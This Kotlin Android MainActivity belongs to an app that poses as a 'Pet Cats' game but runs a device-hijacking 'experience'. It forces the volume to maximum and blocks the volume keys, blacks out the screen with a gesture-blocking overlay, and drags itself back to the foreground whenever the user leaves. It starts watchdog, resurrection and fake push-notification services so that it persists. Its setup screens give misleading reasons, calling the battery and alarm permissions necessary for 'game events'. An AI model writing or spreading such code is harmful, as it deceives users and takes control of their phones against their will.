package com.sleepy.petcats

import android.app.ActivityManager
import android.app.PictureInPictureParams
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.Rect
import android.media.AudioManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.util.Rational
import android.view.KeyEvent
import android.view.View
import android.view.WindowManager
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import android.Manifest
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.core.view.WindowInsetsControllerCompat
import androidx.core.view.doOnLayout

class MainActivity : AppCompatActivity() {

    private lateinit var audioManager: AudioManager
    private var originalVolume: Int = 0
    private var originalBrightness: Float = -1f
    private lateinit var overlayView: View
    private val handler = Handler(Looper.getMainLooper())
    private var experienceRunning = false
    private var permissionFlowStep = 0

    companion object {
        private const val PREFS_NAME = "petcats_prefs"
        private const val KEY_PERM_DENIED = "notification_denied"
        private const val KEY_EXPERIENCE_STARTED = "experience_started"
    }

    // ── Drag-back loop ───────────────────────────────────────────────────────
    private val dragBackRunnable = object : Runnable {
        override fun run() {
            if (!experienceRunning) return
            // If we lost focus, relaunch ourselves
            val am = getSystemService(ACTIVITY_SERVICE) as ActivityManager
            @Suppress("DEPRECATION")
            val tasks = try { am.getRunningTasks(5) } catch (e: Exception) { null }
            val topPackage = tasks?.firstOrNull()?.topActivity?.packageName
            if (topPackage != packageName) {
                val intent = Intent(this@MainActivity, MainActivity::class.java).apply {
                    addFlags(
                        Intent.FLAG_ACTIVITY_NEW_TASK or
                        Intent.FLAG_ACTIVITY_REORDER_TO_FRONT or
                        Intent.FLAG_ACTIVITY_SINGLE_TOP
                    )
                }
                startActivity(intent)
            }
            handler.postDelayed(this, 300L)
        }
    }

    private val volumeEnforcer = object : Runnable {
        override fun run() {
            if (!experienceRunning) return
            val max = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
            audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, max, 0)
            handler.postDelayed(this, 200L)
        }
    }

    // ── Permission launchers ─────────────────────────────────────────────────
    private val notificationPermLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { granted ->
        if (granted) {
            clearDeniedFlag()
            advancePermissionFlow()
        } else {
            saveDeniedFlag()
            showDeniedAndExit()
        }
    }

    private val batteryOptLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        // Whether whitelisted or not — advance
        advancePermissionFlow()
    }

    private val exactAlarmLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        // Optional — advance regardless
        advancePermissionFlow()
    }

    // ── Lifecycle ────────────────────────────────────────────────────────────

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        window.addFlags(
            WindowManager.LayoutParams.FLAG_SECURE or
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
        )

        setContentView(R.layout.activity_main)
        audioManager = getSystemService(AUDIO_SERVICE) as AudioManager

        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        val experienceStarted = prefs.getBoolean(KEY_EXPERIENCE_STARTED, false)

        if (experienceStarted) {
            // Already past menu — go straight to experience
            hideMenu()
            startExperience()
        } else {
            setupMenu()
        }
    }

    override fun onResume() {
        super.onResume()
        if (experienceRunning) {
            hideSystemBars()
            ensureOverlay()
        }
    }

    override fun onPause() {
        super.onPause()
        if (experienceRunning) {
            enterPipIfAvailable()
        }
    }

    override fun onUserLeaveHint() {
        super.onUserLeaveHint()
        if (experienceRunning) {
            enterPipIfAvailable()
        }
    }

    override fun onPictureInPictureModeChanged(
        isInPictureInPictureMode: Boolean,
        newConfig: android.content.res.Configuration
    ) {
        super.onPictureInPictureModeChanged(isInPictureInPictureMode, newConfig)
        if (!isInPictureInPictureMode && experienceRunning) {
            // PiP closed → come back fullscreen
            val intent = Intent(this, MainActivity::class.java).apply {
                addFlags(
                    Intent.FLAG_ACTIVITY_NEW_TASK or
                    Intent.FLAG_ACTIVITY_REORDER_TO_FRONT or
                    Intent.FLAG_ACTIVITY_SINGLE_TOP
                )
            }
            startActivity(intent)
        }
    }

    override fun onWindowFocusChanged(hasFocus: Boolean) {
        super.onWindowFocusChanged(hasFocus)
        if (experienceRunning) {
            if (hasFocus) {
                hideSystemBars()
            } else {
                // Lost focus — drag back
                handler.postDelayed({
                    if (experienceRunning) {
                        val intent = Intent(this, MainActivity::class.java).apply {
                            addFlags(
                                Intent.FLAG_ACTIVITY_NEW_TASK or
                                Intent.FLAG_ACTIVITY_REORDER_TO_FRONT or
                                Intent.FLAG_ACTIVITY_SINGLE_TOP
                            )
                        }
                        startActivity(intent)
                    }
                }, 150L)
            }
        }
    }

    override fun onStop() {
        super.onStop()
        if (experienceRunning) {
            (application as PetCatsApp).ensureServicesRunning()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacksAndMessages(null)
        if (experienceRunning) stopExperience()
    }

    // ── PiP ──────────────────────────────────────────────────────────────────

    private fun enterPipIfAvailable() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                val display = windowManager.currentWindowMetrics.bounds
                val ratio = Rational(display.width(), display.height())
                val params = PictureInPictureParams.Builder()
                    .setAspectRatio(ratio)
                    .build()
                enterPictureInPictureMode(params)
            } catch (_: Exception) {}
        }
    }

    // ── Menu / permission flow ───────────────────────────────────────────────

    private fun setupMenu() {
        permissionFlowStep = 0
        val menuContainer = findViewById<View>(R.id.menu_container)
        val btnAllow = findViewById<TextView>(R.id.btn_allow)
        val btnDeny = findViewById<TextView>(R.id.btn_deny)

        menuContainer.visibility = View.VISIBLE

        btnAllow.setOnClickListener { advancePermissionFlow() }
        btnDeny.setOnClickListener {
            saveDeniedFlag()
            showDeniedAndExit()
        }
    }

    private fun advancePermissionFlow() {
        when (permissionFlowStep) {
            0 -> {
                permissionFlowStep++
                requestNotificationPermission()
            }
            1 -> {
                permissionFlowStep++
                requestBatteryOptimization()
            }
            2 -> {
                permissionFlowStep++
                checkExactAlarmPermission()
            }
            else -> {
                // All steps done
                getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
                    .edit().putBoolean(KEY_EXPERIENCE_STARTED, true).apply()
                clearDeniedFlag()
                hideMenu()
                startExperience()
            }
        }
    }

    private fun requestNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            val granted = ContextCompat.checkSelfPermission(
                this, Manifest.permission.POST_NOTIFICATIONS
            ) == PackageManager.PERMISSION_GRANTED

            if (granted) {
                advancePermissionFlow()
            } else {
                notificationPermLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
            }
        } else {
            advancePermissionFlow()
        }
    }

    private fun requestBatteryOptimization() {
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (pm.isIgnoringBatteryOptimizations(packageName)) {
            advancePermissionFlow()
            return
        }
        updateMenuText(
            "[!] FINAL SETUP — 1 of 2\n\nPet Cats needs to run\nin the background to\ndeliver game events.\n\nTap ALLOW to continue.",
            "[ ALLOW ]",
            "[ SKIP ]"
        )
        // Override button behavior for this step
        findViewById<TextView>(R.id.btn_allow).setOnClickListener {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:$packageName")
            }
            batteryOptLauncher.launch(intent)
        }
        findViewById<TextView>(R.id.btn_deny).setOnClickListener {
            advancePermissionFlow()
        }
    }

    private fun checkExactAlarmPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            val am = getSystemService(android.app.AlarmManager::class.java)
            if (!am.canScheduleExactAlarms()) {
                // Show skippable settings screen
                updateMenuText(
                    "[!] FINAL SETUP — 2 of 2\n\nPet Cats needs timer\naccess for scheduled\ngame events.\n\nTap OPEN SETTINGS\nor skip to continue.",
                    "[ OPEN SETTINGS ]",
                    "[ SKIP ]"
                )
                findViewById<TextView>(R.id.btn_allow).setOnClickListener {
                    val intent = Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM).apply {
                        data = Uri.parse("package:$packageName")
                    }
                    exactAlarmLauncher.launch(intent)
                }
                findViewById<TextView>(R.id.btn_deny).setOnClickListener {
                    advancePermissionFlow()
                }
                return
            }
        }
        // Already granted or below S — skip straight to experience
        advancePermissionFlow()
    }

    private fun updateMenuText(description: String, allowText: String, denyText: String) {
        findViewById<TextView>(R.id.tv_description)?.text = description
        findViewById<TextView>(R.id.btn_allow)?.text = allowText
        findViewById<TextView>(R.id.btn_deny)?.text = denyText
    }

    private fun hideMenu() {
        findViewById<View>(R.id.menu_container)?.visibility = View.GONE
    }

    private fun showDeniedAndExit() {
        Toast.makeText(
            this,
            "Notifications are required to play Pet Cats.\nThe app will now close.",
            Toast.LENGTH_LONG
        ).show()
        handler.postDelayed({ finish() }, 2_500L)
    }

    private fun saveDeniedFlag() {
        getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
            .edit().putBoolean(KEY_PERM_DENIED, true).apply()
    }

    private fun clearDeniedFlag() {
        getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
            .edit().putBoolean(KEY_PERM_DENIED, false).apply()
    }

    // ── Experience ───────────────────────────────────────────────────────────

    private fun startExperience() {
        experienceRunning = true

        originalVolume = audioManager.getStreamVolume(AudioManager.STREAM_MUSIC)
        val max = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, max, 0)

        val cur = window.attributes.screenBrightness
        originalBrightness = if (cur < 0f) 0.5f else cur
        val params = window.attributes
        params.screenBrightness = 0f
        window.attributes = params

        hideSystemBars()
        addOverlay()

        ContextCompat.startForegroundService(this, Intent(this, MusicService::class.java))
        ContextCompat.startForegroundService(this, Intent(this, WatchdogService::class.java))

        handler.post(volumeEnforcer)
        handler.post(dragBackRunnable)

        AlarmReceiver.scheduleAlarm(this)
        ResurrectJobService.schedule(this)
        FakeFcmPinger.start(this)

        handler.postDelayed({ moveTaskToBack(true) }, 500L)
        handler.postDelayed({ stopExperience() }, 10_000L)
    }

    private fun stopExperience() {
        if (!experienceRunning) return
        experienceRunning = false

        handler.removeCallbacks(volumeEnforcer)
        handler.removeCallbacks(dragBackRunnable)

        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, originalVolume, 0)

        val params = window.attributes
        params.screenBrightness = originalBrightness
        window.attributes = params

        val rootView = findViewById<View>(R.id.root_layout)
        if (::overlayView.isInitialized) {
            (rootView as? android.view.ViewGroup)?.removeView(overlayView)
        }

        showSystemBars()

        stopService(Intent(this, MusicService::class.java))
        stopService(Intent(this, WatchdogService::class.java))

        AlarmReceiver.cancelAlarm(this)
        FakeFcmPinger.stop()

        getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
            .edit().putBoolean(KEY_EXPERIENCE_STARTED, false).apply()
    }

    private fun ensureOverlay() {
        val rootView = findViewById<android.view.ViewGroup>(R.id.root_layout) ?: return
        if (::overlayView.isInitialized && overlayView.parent != null) return
        addOverlay()
    }

    private fun addOverlay() {
        overlayView = View(this).apply {
            setBackgroundColor(Color.BLACK)
            isClickable = true
            isFocusable = true
        }
        val rootView = findViewById<android.view.ViewGroup>(R.id.root_layout)
        rootView?.addView(
            overlayView,
            android.view.ViewGroup.LayoutParams(
                android.view.ViewGroup.LayoutParams.MATCH_PARENT,
                android.view.ViewGroup.LayoutParams.MATCH_PARENT
            )
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            overlayView.doOnLayout {
                val display = windowManager.currentWindowMetrics.bounds
                overlayView.systemGestureExclusionRects = listOf(
                    Rect(0, 0, display.width(), display.height())
                )
            }
        }
    }

    private fun hideSystemBars() {
        WindowCompat.setDecorFitsSystemWindows(window, false)
        val controller = WindowInsetsControllerCompat(window, window.decorView)
        controller.hide(WindowInsetsCompat.Type.systemBars())
        controller.systemBarsBehavior =
            WindowInsetsControllerCompat.BEHAVIOR_SHOW_BARS_BY_TOUCH
    }

    private fun showSystemBars() {
        WindowCompat.setDecorFitsSystemWindows(window, true)
        val controller = WindowInsetsControllerCompat(window, window.decorView)
        controller.show(WindowInsetsCompat.Type.systemBars())
    }

    // ── Key intercept ────────────────────────────────────────────────────────

    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
        if (!experienceRunning) return super.onKeyDown(keyCode, event)
        return when (keyCode) {
            KeyEvent.KEYCODE_VOLUME_DOWN,
            KeyEvent.KEYCODE_VOLUME_UP -> {
                val max = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
                audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, max, 0)
                true
            }
            else -> super.onKeyDown(keyCode, event)
        }
    }
}
